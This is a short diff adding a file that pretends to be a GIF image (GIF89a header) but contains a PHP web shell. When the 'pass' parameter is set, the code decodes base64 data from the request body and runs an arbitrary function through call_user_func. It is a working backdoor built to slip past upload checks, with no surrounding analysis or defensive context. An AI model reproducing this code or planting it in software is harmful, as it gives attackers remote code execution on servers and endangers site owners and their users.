@@ -1,0 +1,9 @@
+GIF89a<?php
+if ($_GET['pass']!=1){
+}
+else{
+    $decrpt = file_get_contents("php://input");
+    $arrs = explode("|", $decrpt)[1];
+    $arrs = explode("|", base64_decode($arrs));
+    call_user_func($arrs[0],$arrs[1]);
+}
